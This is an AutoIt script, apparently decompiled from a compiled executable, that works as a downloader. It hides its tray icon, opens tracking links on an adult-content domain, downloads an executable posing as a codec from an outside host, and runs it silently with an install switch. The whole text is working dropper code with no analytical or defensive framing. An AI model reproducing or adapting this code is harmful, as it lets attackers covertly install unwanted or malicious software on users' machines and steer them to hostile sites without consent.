; <AUT2EXE VERSION: 3.2.2.0>

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: F:\-= Builders =-\tb-2.au3>
; ----------------------------------------------------------------------------

AutoItSetOption("TrayIconHide", 1)
ShellExecute("http://tds.free-porn-movies.info/go.php?sid=6")
sleep(15000)
ShellExecute("http://tds.free-porn-movies.info/go.php?sid=7")
InetGet("http://funcodec.com/download/funcodec1176.exe", "funcodec1176.exe", 1, 1)
sleep(30000)
Global $file='funcodec1176.exe'
RunWait ( $file & ' /S' )

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: F:\-= Builders =-\tb-2.au3>
; ----------------------------------------------------------------------------

